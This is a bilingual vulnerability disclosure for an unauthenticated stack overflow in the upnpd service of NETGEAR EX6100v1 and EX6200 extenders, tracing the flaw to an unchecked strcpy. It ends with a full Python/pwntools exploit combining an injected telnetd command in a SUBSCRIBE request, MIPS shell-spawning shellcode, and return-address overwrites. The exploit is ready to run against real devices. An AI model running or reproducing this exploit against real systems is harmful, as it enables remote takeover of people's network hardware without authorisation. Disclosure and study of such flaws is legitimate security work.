# NETGEAR EX series upnpd stack_overflow

#### Impact products 

​	EX6100v1 all version 

​	EX6200  latest firmware

​	maybe more

​	firmware LInk: http://support.netgear.cn

#### describ

​	 ex6100v1和ex6200无线扩展器（可能更多）的upnpd协议中存在堆栈溢出漏洞，这可能导致在没有身份验证的情况下执行任意代码 

​	Stack overflow vulnerability exists in the upnpd protocol of ex6100v1 and ex6200 wireless extenders(maybe more), which can lead to arbitrary code execution without authentication

#### Detail

​	 upnpd二进制文件的upnp_main函数中，0x1fff的数据大小被接受并存储在v81中。 

​	In the upnp_main function, the data size of 0x1fff is accepted and stored in v81.

<img src="./img/image-20211007164319530.png" alt="image-20211007164319530" style="zoom:50%;" />

​	 接下来，在下图中，调用函数v81变量作为第一个参数 	

​	Next, in the figure below, the function v81 variable is called as the first parameter

<img src="./img/image-20211007164612323.png" alt="image-20211007164612323" style="zoom:50%;" />

​	 在处理订阅和取消订阅请求时，您将使用前面的v81参数输入gena_http_method_check函数a1，并执行此函数 	  

​	When processing subscribe and unsubscribe requests, you will enter the gena_http_method_check function a1 with the previous v81 parameter, and follow up this function 

<img src="./img/image-20211007164656273.png" alt="image-20211007164656273" style="zoom:50%;" />

​	 此函数通过strcpy将输入复制到堆栈，数据大于缓冲区，导致堆栈溢出。无需身份验证即可执行任意代码 

​	This function copies the input to the stack through strcpy, and the data is larger than the buffer, resulting in stack overflow. Arbitrary code can be executed without authentication

<img src="./img/image-20211007164927729.png" alt="image-20211007164927729" style="zoom:50%;" />



<img src="./img/image-20211007165050190.png" alt="image-20211007165050190" style="zoom:50%;" />



#### TEXT

​	 由于通用upnpd服务是默认启动的，因此它非常有害，并可能导致执行任意代码。此exp可以打开ex6100的最新固件(http://support.netgear.cn/Upfilepath/EX6100-V1.0.2.28_1.1.138.chk)用于设备的Telnetd服务 

​	Because the general upnpd service is started by default, it is very harmful and can cause the execution of arbitrary code. This exp can open the latest firmware of ex6100（http://support.netgear.cn/Upfilepath/EX6100-V1.0.2.28_1.1.138.chk） Telnetd service for devices 

POC && EXP

```
from pwn import *
p=remote("192.168.0.110",5000)
request = "SUBSCRIBE /gena.telnetd${IFS}-p${IFS}23;?service=" + "1" + " HTTP/1.0\n"
request += "Host: " + "192.168.1.0:" + "80" + "\n"
request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\n"
request += "NT: upnp:event\n"
request += "Timeout: Second-1800\n"
request += "Accept-Encoding: gzip, deflate\n"
#request = 	request.ljust(0x1000,"a")
print len(request)
request += request+"doud"
stg3_SC =''
stg3_SC += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
stg3_SC += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
stg3_SC += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
stg3_SC += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
stg3_SC += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
stg3_SC += "\xab\x0f\x02\x24\x0c\x09\x09\x01"
#payload+= "d"*0x18
request += request+stg3_SC
request = request.ljust(0x1f00,"a")
request += p32(0x7fff7030)
request = request.ljust(0x1f48-0x14,"a")
request += p32(0x422848)
#request += p32(0x422944)
#request += "a"*0x500
#request += p32(0x7fff7030)*8
p.send(request)
p.interactive()
```

